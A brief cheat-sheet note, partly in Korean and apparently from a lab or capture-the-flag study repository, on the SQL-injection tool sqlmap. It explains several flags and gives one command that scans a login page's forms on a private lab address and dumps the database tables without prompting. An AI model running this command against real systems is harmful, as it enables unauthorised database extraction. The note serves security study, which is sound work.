sqlmap
#
`useful command`
```
--batch             사용자 입력을 요청하지 않음, 기본 동작 사용
--dump              DBMS 데이터베이스 테이블 항목 덤프
-a, --all           Retrieve everything
--forms             페이지의 <form> 요소에서 매개변수를 자동으로 선택
```
#
```
sqlmap -u http://10.10.96.80/administrator.php --forms --dump --batch  
```
![image](https://user-images.githubusercontent.com/61821641/149613597-4c6b2fa4-5ab7-435e-bb7a-29fc4cd9a3a9.png)
![image](https://user-images.githubusercontent.com/61821641/149613318-76b35cb6-4232-439d-80d4-bb567681e889.png)
